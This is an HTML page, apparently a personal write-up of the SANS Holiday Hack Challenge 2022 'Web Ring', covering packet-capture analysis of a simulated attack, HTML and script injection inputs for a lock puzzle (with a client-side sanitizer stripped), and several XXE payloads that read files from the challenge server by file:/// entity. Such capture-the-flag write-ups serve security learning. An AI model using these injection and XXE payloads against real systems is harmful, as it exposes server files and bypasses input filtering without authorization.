@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>HHC 2022 Write-Up | Web Ring</title>
+		<link rel="icon" type="image/png" sizes="32x32" href="./assets/img/favicon.png">
+		<link rel="stylesheet" type="text/css" href="./assets/style/main.css">
+		<script src="./assets/js/main.js"></script>
+		<meta charset="UTF-8">
+	</head>
+	<body>
+		<div class="navigation">
+			<h1 class="title">HHC 2022 Write-Up</h1>
+			<a href="./index.html">Home</a>
+			<a href="./orientation.html">Orientation</a>
+			<a href="./tolkien_ring.html">Tolkien Ring</a>
+			<a href="./elfen_ring.html">Elfen Ring</a>
+			<a href="./web_ring.html">Web Ring</a>
+			<a href="./cloud_ring.html">Cloud Ring</a>
+			<a href="./brof.html">Burning Ring of Fire</a>
+		</div>
+		<div class="page">
+			<h1>Recover the Web Ring</h1>
+			<p>After finding the Web Ring door, you can help open the Boria Mine Door to find the Web Ring in Glamtariel's Fountain.</p>
+			<div class="table_of_contents">
+				<h2 class="title">Contents</h2>
+				<a href="#objective1">Naughty IP</a>
+				<a href="#objective2">Credential Mining</a>
+				<a href="#objective3">404 FTW</a>
+				<a href="#objective4">IMDS, XXE, and Other Abbreviations</a>
+				<a href="#objective5">Open Boria Mine Door</a>
+				<a href="#objective6">Glamtariel's Fountain</a>
+			</div>
+			<div class="section" id="objective1">
+				<h1>1. Naughty IP <span style="color: #ee0e0e;">★</span><span style="color: #ffffff">★★★★</span></h1>
+				<div class="contents">
+					Use either the PCAP or LOG file to find the IP address with the most network traffic.<br><br>
+					<div class="quote">
+						<div class="speaker">Alabaster Snowball</div>
+						<div>"Hey there! I'm Alabaster Snowball"</div>
+						<div>"And I have to say, I'm a bit distressed."</div>
+						<div>"I was working with the dwarves and their Boria mines, and I found some disturbing activity!"</div>
+						<div>"Looking through <a href="https://storage.googleapis.com/hhc22_player_assets/boriaArtifacts.zip" target="_blank">these artifacts</a>, I think something naughty's going on."</div>
+						<div>"Can you please take a look and answer a few questions for me?"</div>
+						<div>"First, we need to know where the attacker is coming from."</div>
+						<div>"If you haven't looked at Wireshark's Statistics menu, this might be a good time!"</div>
+						<div>"..."</div>
+					</div><br>
+					<img src="./assets/img/naughty-ip.png">
+				</div>
+			</div>
+			<div class="section" id="objective2">
+				<h1>2. Credential Mining <span style="color: #ee0e0e;">★</span><span style="color: #ffffff">★★★★</span></h1>
+				<div class="contents">
+					Use either the PCAP or LOG file to find the first username that the attacker tried.<br><br>
+					<div class="quote">
+						<div class="speaker">Alabaster Snowball</div>
+						<div>"Aha, you found the naughty actor! Next, please look into the account brute force attack."</div>
+						<div>"You can focus on requests to <code class="code_inline">/login.html</code>~"</div>
+						<div>"..."</div>
+					</div><br>
+					Use Wireshark's search tool to search for "invalid username" to find where the attack took place.<br>
+					Then you can look through the attack to find the first valid username that was tried.<br><br>
+					<img src="./assets/img/credential-mining.png">
+				</div>
+			</div>
+			<div class="section" id="objective3">
+				<h1>3. 404 FTW <span style="color: #ee0e0e;">★</span><span style="color: #ffffff">★★★★</span></h1>
+				<div class="contents">
+					Use either the PCAP or LOG file to find the first successful URL that the attacker found.<br><br>
+					<div class="quote">
+						<div class="speaker">Alabaster Snowball</div>
+						<div>"Alice? I totally expected Eve! Well how about forced browsing? What's the first URL path they found that way?"</div>
+						<div>"The misses will have HTTP status code <code class="code_inline">404</code> and, in this case, the successful guesses return <code class="code_inline">200</code>."</div>
+						<div>"..."</div>
+					</div><br>
+					Search for "HTTP/1.1 200" to find URLs that the attacker found.<br><br>
+					<img src="./assets/img/404-ftw.png">
+				</div>
+			</div>
+			<div class="section" id="objective4">
+				<h1>4. IMDS, XXE, and Other Abbreviations <span style="color: #ee0e0e;">★★</span><span style="color: #ffffff">★★★</span></h1>
+				<div class="contents">
+					Use either the PCAP or LOG file to find the URL that the attacker forced onto the server.<br><br>
+					<div class="quote">
+						<div class="speaker">Alabaster Snowball</div>
+						<div>"Great! Just one more challenge! It looks like they made the server pull credentials from IMDS. What URL was forced?"</div>
+						<div>"AWS uses a specific IP address for IMDS lookups. Searching for that in the PCAP should get you there quickly."</div>
+						<div>"..."</div>
+					</div><br>
+					Search for the ip address "169.254.169.254" to find the IMDS/XXE attack.<br><br>
+					<img src="./assets/img/imds-xxe-and-other-abbreviations.png">
+				</div>
+			</div>
+			<div class="section" id="objective5">
+				<h1>5. Open Boria Mine Door <span style="color: #ee0e0e;">★★★</span><span style="color: #ffffff">★★</span></h1>
+				<div class="contents">
+					Help Hal Tandybuck unlock at least three of the locks to open the door.<br><br>
+					<div class="quote">
+						<div class="speaker">Hal Tandybuck</div>
+						<div>"Oh hi, I'm Hal Tandybuck. And who might you be?"</div>
+						<div>"I'm hanging out by the door to the mines here because, well, I haven't figured out the locks yet."</div>
+						<div>"It actually reminds me of this locked crate I had three years ago..."</div>
+						<div>"I doubt we'll get much in the way of debug output."</div>
+						<div>"Think you can help me get through?"</div>
+						<div>"..."</div>
+					</div><br>
+					<code class="code_large">// Pin 1
+@&@&&W&&W&&&&
+
+// Pin 2
+<span><</span>textarea rows="100" cols="100"><span><</span>/textarea>
+
+// Pin 3
+<span><</span>textarea rows="100" cols="100" id="fill"><span><</span>/textarea>
+<span><</span>script>
+document.getElementById("fill").style.backgroundColor = "#0000FF";
+<span><</span>/script>
+
+// Pin 4
+<span><</span>div><span><</span>textarea rows=3 cols=100"><span><</span>/textarea><span><</span>marquee bgcolor="#0000FF">a<span><</span>/marquee>
+
+// Pin 5 - Remove onblur="sanitizeInput()" from inputText element THEN input:
+<span><</span>div id="red">
+a
+<span><</span>div id="blue">a<span><</span>/div>
+<span><</span>/div>
+<span><</span>script>
+document.getElementById("red").style.backgroundColor = "#FF0000";
+document.getElementById("red").style.color = "#FF0000";
+document.getElementById("red").style.fontSize = "70px";
+document.getElementById("blue").style.backgroundColor = "#0000FF";
+document.getElementById("blue").style.color = "#0000FF";
+document.getElementById("blue").style.marginLeft = "10px";
+<span><</span>/script>
+
+// Pin 6
+<span><</span>img src=" data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAACqBAMAAAAaSh38AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJUExURQD/AP8AAAAA/2zuq2cAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABRSURBVHja7c0xEQAwCASwWngL9S+yFjpwDJAYyAEAAAAA4EcaSCQSiUQikUgkEolEIpFIJKOSW0oikUgkEolEIpFIJBKJRCKRSCQSiUSyKUke7IJdl0MkUXIAAAAASUVORK5CYII="></code><br>
+					<img src="./assets/img/open-boria-mine-door-all.png">
+				</div>
+			</div>
+			<div class="section" id="objective6">
+				<h1>6. Glamtariel's Fountain <span style="color: #ee0e0e;">★★★★★</span></h1>
+				<div class="contents">
+					Drag the objects to the princess and the fountain to complete the game, then talk to them in a different language.<br><br>
+					<img src="./assets/img/glamtariels-fountain-intro.png"><br><br>
+					Pay attention to the CAPITALIZED words.<br><br>
+					<code class="code_large">TRAFFIC FLIES
+TAMPER
+PATH
+APP
+TYPE
+RINGLIST
+SIMPLE FORMAT</code><br>
+					Once you finish dragging all the objects to each of the characters, you can start the fun part.<br>
+					Using <a href="https://www.zaproxy.org/" target="_blank">OWASP ZAP</a>, you can intercept the HTTP requests to the server.<br><br>
+					<code>{"imgDrop":"img1","who":"princess","reqType":"json"}</code><br>
+					The capitalized words hint that you should tamper with the network traffic in a different type of language (xml).<br>
+					First, convert the default request to xml and change <code class="code_inline">Content-Type</code> to <code class="code_inline">application/xml</code>.<br><br>
+					<code><span><</span>foo>
+	<span><</span>imgDrop>img1<span><</span>/imgDrop>
+	<span><</span>who>princess<span><</span>/who>
+	<span><</span>reqType>xml<span><</span>/reqType>
+<span><</span>/foo></code><br>
+					You should get the following response:<br><br>
+					<code>{
+	"appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
+	"droppedOn": "none",
+	"visit": "none"
+}</code><br>
+					Now you can try to find the ringlist that was hinted at by the capitalized words.<br>
+					Using XXE, you can request files on the host machine.<br>
+					The capitalized words hint that you should look in the app directory and that the ringlist is stored in a simple format.<br>
+					Other assets from the website are in <code class="code_inline">static/images/</code>.<br>
+					Based on this we can guess that the ringlist is at <code class="code_inline">/app/static/images/ringlist.txt</code>.<br><br>
+					<code><span><</span>?xml  version="1.0" encoding="ISO-8859-1"?>
+<span><</span>!DOCTYPE foo [
+	<span><</span>!ENTITY xxe SYSTEM  "file:///app/static/images/ringlist.txt" >]>
+<span><</span>foo>
+	<span><</span>imgDrop>&xxe;<span><</span>/imgDrop>
+	<span><</span>who>princess<span><</span>/who>
+	<span><</span>reqType>xml<span><</span>/reqType>
+<span><</span>/foo></code>
+					<code>{
+	"appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
+	"droppedOn": "none",
+	"visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
+}</code><br>
+					<img src="./assets/img/pholder-morethantopsupersecret63842.png"><br><br>
+					The image has a folder named "x_phial_pholder_2022" that contains two visible files named <code class="code_inline">bluering.txt</code> and <code class="code_inline">redring.txt</code>.<br>
+					Requesting the two files doesn't give you anything that interesting.<br>
+					Glamtariel seemed to like the silver ring. Let's try asking about that.<br><br>
+					<code><span><</span>?xml  version="1.0" encoding="ISO-8859-1"?>
+<span><</span>!DOCTYPE foo [
+	<span><</span>!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
+<span><</span>foo>
+	<span><</span>imgDrop>&xxe;<span><</span>/imgDrop>
+	<span><</span>who>princess<span><</span>/who>
+	<span><</span>reqType>xml<span><</span>/reqType>
+<span><</span>/foo></code>
+					<code>{
+	"appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
+	"droppedOn": "none",
+	"visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
+}</code><br>
+					<img src="./assets/img/redring-supersupersecret928164.png"><br><br>
+					The defiled red ring says <code class="code_inline">goldring_to_be_deleted.txt</code>.<br><br>
+					<code><span><</span>?xml  version="1.0" encoding="ISO-8859-1"?>
+<span><</span>!DOCTYPE foo [
+	<span><</span>!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
+<span><</span>foo>
+	<span><</span>imgDrop>&xxe;<span><</span>/imgDrop>
+	<span><</span>who>princess<span><</span>/who>
+	<span><</span>reqType>xml<span><</span>/reqType>
+<span><</span>/foo></code>
+					<code>{
+	"appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
+	"droppedOn": "none",
+	"visit": "none"
+}</code><br>
+					We found a new capitalized word: REQ<br>
+					This hints that we should move the xxe payload to <code class="code_inline">reqType</code>.<br><br>
+					<code><span><</span>?xml  version="1.0" encoding="ISO-8859-1"?>
+<span><</span>!DOCTYPE foo [
+	<span><</span>!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
+<span><</span>foo>
+	<span><</span>imgDrop>img1<span><</span>/imgDrop>
+	<span><</span>who>princess<span><</span>/who>
+	<span><</span>reqType>&xxe;<span><</span>/reqType>
+<span><</span>/foo></code>
+					<code>{
+	"appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
+	"droppedOn": "none",
+	"visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
+}</code><br>
+					<img src="./assets/img/goldring-morethansupertopsecret76394734.png"><br>
+					We have found the gold ring.<br>
+					The last step is to submit <code class="code_inline">goldring-morethansupertopsecret76394734.png</code> in the Objectives menu.<br>
+				</div>
+			</div>
+			<div class="section">
+				<div class="contents">
+					<img src="./assets/img/web-ring.png">
+				</div>
+			</div>
+		</div>
+		<div class="next_prev">
+			<a class="next" href="./cloud_ring.html">Next</a>
+			<a class="prev" href="./elfen_ring.html">Previous</a>
+		</div>
+		<footer>
+			<div class="float_left">Brian DeBaggis</div>
+			<div class="right">1/6/2023</div>
+		</footer>
+	</body>
+</html>
